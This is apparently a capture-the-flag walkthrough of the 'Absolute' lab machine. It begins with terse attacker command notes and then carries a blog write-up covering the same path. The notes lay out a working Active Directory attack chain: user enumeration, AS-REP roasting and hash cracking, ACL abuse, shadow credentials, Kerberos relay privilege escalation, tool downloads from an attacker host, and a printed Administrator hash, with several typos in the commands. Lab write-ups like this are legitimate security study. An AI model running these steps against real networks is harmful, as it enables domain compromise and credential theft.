kerbrute userenum --dc absolute.htb -d absolute.htb /usr/share/wordlists/kerberos_enum_userlists/A-Z.Surnames.txt

impacket-GETNPUsers absolsute.htb/  -no-pass -usersfile users.txt

hashcat -m 18200 hash rockyou.txt

d.klay@absolute.htb    Darkmoonsky248girl

ntpdate -s absolute.htb 

impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl'

export KRB5CCNAME=d.klay.ccache

ntpdate -s absolute.htb

absolute.htb\mlovegod

AbsoluteLDAP2022!

#
ANY NTPDATE DO A PING ON THE IP AFTER




rm -rf m.lovegod.ccache    # if needed
impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'
export KRB5CCNAME=m.lovegod.ccache

python3 bloodhound.py -u m.lovegod -d -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -no-pass -c All

BUNCH OF POWERSHELL THINGS called PowerSPloit

$dc_domain="ABSOLUTE.HTB"
$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!"  -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ABSOLUTE.HTB\m.lovegod', $SecPassword)
Add-DomainObjectACL -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController DC.ABSOLUTE.HTB -princip
Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf 'Network Audit' -Credential $Cred -Server DC.ABSOLUTE.HTB
Get-DomainGroupMember -Identity 'netowrk audit' -Domain $dc_domain -DomainController DC.ABSOLUTE.HTB -Credential $cred


then pyshisker -d absolute.htb -u "m.lovegod"  -k --no-pass -t "winrm_user"  --action "add"

cat /etc/krb5.conf

[libdefaults]
	default_realm = ABSOLUTE.HTB
[realms]
	ABSOLUTE.HTB = {
		kdc = DC.ABSOLUTE.HTB
		admin_server = ABSOLUTE.HTB
}


python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx <pfx> -pfx-pass <password> winrm_user_ccache

<pfx> is from the pywhisker as is <password>

export KRB5CCNAME=winrm_user_ccache

ntpdate -s absolute.htb

evil-winrm -i  dc.absolute.htb -r absolute.htb

from inside evil-winrm

#https://github.com/cube0x0/KrbRelay
#https://github.com/antonioCoco/RunasCs
#https://github.com/GhostPack/Rubeus

wget http://10.10.14.5:8000/Rubeus.exe -O ./Rubeus.exe
wget http://10.10.14.5:8000/KrbRelay.exe -O ./KK.exe
wget http://10.10.14.5:8000/RunasCs.exe -O ./RunasCs.exe


RunsasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 "C:\Users\winrm_user\Documents\KK.exe -spn ldap/dcabsolute.htb -clsid {NUMBERSSSSS} -shadowcred"

evil winrm -i DC.ABSOLUTE.HTB -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea 


sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [10.129.159.158](http://10.129.159.158) -oG allPorts
  
  

.cme smb absolute.htb

  

for i in {1..10} ; do wget "[http://absolute.htb/images/hero_$i.jpg](http://absolute.htb/images/hero_$i.jpg)" &>/dev/null; done

  

ls -la

exiftool * | grep Author | awk '{print$3"."$4}'

  

cat PotentialUsernames.txt

  

go run . userenum ../protentialusernames.txt --dc dc.absolute.htb -d absolute.htb

  

john test. txt -w=rockyou.txt

./cme smb absolute.htb -u "d.klay" -p "Darkmoonsky248girl"

  

impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip dc.absolute.htb

  

export KRB5CCNAME=/home/max/abs/d.klay.ccache

./cme ldap absolute.htb -k --kdcHost dc.absolute.htb --users

  

./cme smb dc.absolute.htb -k --kdcHost dc.absolute.htb --shares

  

impacket-smbclient -k -no-pass -dc-ip dc.absolute.htb 'dc.absolute.htb'

  

ls -la

  

python3 [bloodhound.py](http://bloodhound.py) -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns [10.10.11.181](http://10.10.11.181) --dns-tcp --zip -no-pass -c All


![]([FO-Sec](https://www.fo-sec.com/)

[Home](https://www.fo-sec.com/)[Cheatsheet](https://www.fo-sec.com/cheatsheet)[Writeups](https://www.fo-sec.com/writeups)[Articles](https://www.fo-sec.com/articles)

1.  [Home](https://www.fo-sec.com/)
2.  [Writeups](https://www.fo-sec.com/writeups)
3.  Absolute

# Absolute

### Reconnaissance

This is a very complex machine so performing a good enumeration will be the key to success. As always, it's best to start with an NMAP scan to see what we can enumerate.

NMAP output

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271059%27%20height=%271029%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fnmap.png&w=3840&q=75)

Looks like a standard domain controller. We can also see the domain name so add absolute.htb and dc.absolute.htb to the /etc/hosts file in advance. Another notable thing to see is that winrm is open so we may need to use it later to gain access.

Another good tool to gather initial information is CrackMapExec, as it shows some information related to the OS, computer name, etc. So let's see what we get.

CrackMapExec output

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271192%27%20height=%2773%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fcme.png&w=3840&q=75)

Interesting, so now we know its a Windows 10 and we also know the computer name so I recommend adding it to /etc/hosts as well as some tools need it. Also signing is enabled so responder won't be of use pretty sure.

### Scanning

As we move onto scanning, the first thing I always do is try to list SMB shares with an anonymous account. However in this case it is disabled, so we have to find another route for initial information.

Going into the web, we can see there is not much to do.

Web app look

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271893%27%20height=%271152%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fweb1.png&w=3840&q=75)

Looks like a simple template and little more. I tried to enumerate directories and subdomains but after a while I gave up. However, going back to the root directory we can see there are some images. Let's take a look with exif in case we are missing something.

Script to download images

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27723%27%20height=%27253%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fdownload_images.png&w=1920&q=75)

Getting potential usernames from exiftool

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27437%27%20height=%27142%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fusernames.png&w=1080&q=75)

Perfect, we have some names so let's convert them to potential usernames creating a simple wordlist with usual active directory usernames.

Wordlist with potential usernames

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27257%27%20height=%27347%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fpotential_usernames.png&w=640&q=75)

Remember port 88 aka Kerberos is open. So we can try to check if the usernames are valid via [Kerbrute.](https://github.com/ropnop/kerbrute)

Kerbrute output

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27941%27%20height=%27483%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fkerbrute.png&w=1920&q=75)

Perfect, we know d.klay is a valid user in the domain and it is also an ASREPRoast-able account. Kerbrute already performs this check and outputs the hash, so we can just try to crack it with john or hashcat.

D.Klay ASREPRoast

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27951%27%20height=%27215%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fdklayasreproast.png&w=1920&q=75)

Perfect, we have our first credentials. We could now try it with SMB to see if we have access to at least list the shares.

D.Klay SMB

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271175%27%20height=%27100%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fdklayaccres.png&w=3840&q=75)

However, it looks like we need something else to access it. That may hint to the fact that we can only use the kerberos protocol for authentication. So let's request a valid TGT with the credentials that we have so we can leverage it to gain more access.

Getting TGT for d.klay

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27703%27%20height=%27161%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fdklaytgt.png&w=1920&q=75)

Still couldn't use it to access anything on SMB, but we can use it to access LDAP and list all the users.

Listing LDAP users

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271175%27%20height=%27400%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fldapusers.png&w=3840&q=75)

Perfect, looks like someone forgot to delete the password for an user in their description. So we also gained another set of credentials in this step. By the name we can only guess we will now have access to SMB shares with this account. So let's check with crackmapexec what we can do. Note that you will need to get the TGT for it as well just like for d.klay.

CrackMapExec listing shares

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271175%27%20height=%27328%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fcmesmb.png&w=3840&q=75)

Perfect, shared is the only one interesting at first so let's take a look inside with impacket-smbclient. Note that smbclient throwed errors on my pc, so it is why I moved to impacket's client.

Impacket-smbclient SMB shared content

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27671%27%20height=%27545%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fsmbsharedcontent.png&w=1920&q=75)

And looks like we got a windows executable file as well as a compiler script for it (im guessing). For this part we will need a Windows VM (never run these kind of files in your host). I will be using default Windows 10 for this.

Test.exe behaviour

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27612%27%20height=%27115%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Ftestexebehavior.png&w=1920&q=75)

Doesn't look very descriptive. Let us take a look in wireshark.

Test.exe wireshark logging

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271848%27%20height=%27700%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fwireshark2.png&w=3840&q=75)

Looks like it is trying to authenticate to the DC. And we also get some credentials for a new user (a valid one as we listed all users previously). Username hints to LDAP so let us move onto the pivoting section.

### Pivoting

We have seen that there are many users in this domain. We can try to collect all information in the domain with a LDAP collector and import it in bloodhound to see possible paths for pivoting and privesc.

As bloodhound.py did not work for me because of kerberos protocol errors, I used [this fork](https://github.com/jazzpizazz/BloodHound.py-Kerberos).

Collecting domain information

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271100%27%20height=%27400%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fbloodhoundpy.png&w=3840&q=75)

Now we can import and see all the information in Bloodhound. Remember to start neo4j before bloodhound as it is the database it uses to generate the graphs.

The first query I like to do is list all users in the domain. Don't forget to mark the three users as owned for future queries.

Query all users with "MATCH(u:User) return u"

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271146%27%20height=%271051%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fbloodhoundallusers.png&w=3840&q=75)

At first it looks kinda complex. We can see there's a winrm user and the port for the winrm service is open, so we could see how to get to it. As we only have three users, it's not too hard to query. Playing with it a bit I found a possible path from m.lovegod to the winrm user.

m.lovegod to winrm path

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271146%27%20height=%27730%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Flovegodwinrmpath.png&w=3840&q=75)

A possible path will involve the following steps:

-   Remember we(as m.lovegod) own the Network Audit group but are not memebers of it. So we will need to add ourselves to the group.
-   As members of the group, we now have the GenericWrite permission on winrm_user. This allows us to write on the properties of the object.
-   With that permission, we can now use pyWhisker to add a new KeyCredential as m.lovegod to the winrm_user's msDs-KeyCredentialLink attribute.
-   Last step will provide us with a PFX file and a password, we can now use it to request a TGT with kerberos PKINIT for the winrm_user using gettgtpkinit.py
-   Finally, we can use the TGT to access the winrm service with evil-winrm.

For the first step we can either use Windows or Linux, I will be using Windows for this. As such, we will need to import PowerView and Microsoft's AD module in powershell.

Adding m.lovegod to Network Audit

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271220%27%20height=%27510%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Faddnet.png&w=3840&q=75)

Get new TGT for m.lovegod

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27731%27%20height=%27121%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fgetnewtgt.png&w=1920&q=75)

Add KeyCredential

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27820%27%20height=%27238%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Faddkeycred.png&w=1920&q=75)

Get winrm_user TGT and export KRB5CCNAME

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27981%27%20height=%27193%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fwinrmtgt.png&w=2048&q=75)

Use evil-winrm to get shell

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271100%27%20height=%27450%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fusertxt.png&w=3840&q=75)

And we finally have the user.txt. Now it's time to own the domain.

### Privilege Escalation

There is only one domain admin and that is Administrator, so looks at least it's easy to identify our target.

Since we are already in the domain controller, if we manage to escalate privileges in the computer we will be domain admins on the AD and we can perform a full dump of the NTDS.

After a lot of enumerating and trying methods, I finally found a working one, and that is the no-fix local privesc via kerberos using KrbRelayUp with the ShadowCred method. For this, the following pre-requisites are needed:

-   Domain Controller without LDAP Signing enforced (default)
-   Domain Controller with its own server authentication certificate (for PKINIT authentication)
-   Ability to write the msDs-KeyCredentialLink attribute of the target computer account (default)

The DC validates the two first requisites and m.lovegod validates the last one, so we can try and see if it works.

For this, we will need [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), [Rubeus](https://github.com/GhostPack/Rubeus), and [RunasCS](https://github.com/antonioCoco/RunasCs)(for m.lovegod to execute KrbRelay).

One problem with this method is that KrbRelayUp will not be able to spawn a shell as system directly; this is because SCMUACBypass does not work in this machine(I'm guessing it spawns the shell as another process so we cannot see it and would need RDP to use it). So we will need to use Rubeus to ask for the tgt and give us the NTLM hash that we will use with CrackMapExec to dump the NTDS to get the Administrator NTLM hash and use it to get a shell with evil-winrm.

For more information on the privesc check the following post: [https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html)

As such, full attack will look like the following:

Kerberos relay to LDAP and generate and add new msDS-KeyCredentialLink

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271550%27%20height=%27660%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fprivesc1.png&w=3840&q=75)

Request TGT with generated certificate, perform S4U to get a TGS impersonating Administrator and spawn a shell with SMCUACBypass (fails)

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271200%27%20height=%27820%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fprivesc2.png&w=3840&q=75)

Use Rubeus to ask for a TGT again as DC$ with the same certificate and get NTLM hash via U2U

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271200%27%20height=%27820%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fprivesc3.png&w=3840&q=75)

Use CrackMapExec to dump the NTDS with the NTLM hash from last step

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271230%27%20height=%27465%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fprivesc4.png&w=3840&q=75)

Use Administrator's hash to get shell with evil-winrm.

![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271155%27%20height=%27448%27/%3e)![](https://www.fo-sec.com/_next/image?url=%2Fwriteups%2Fabsolute%2Fprivesc5.png&w=3840&q=75)

And that is all, really fun machine and I learned a lot doing it.
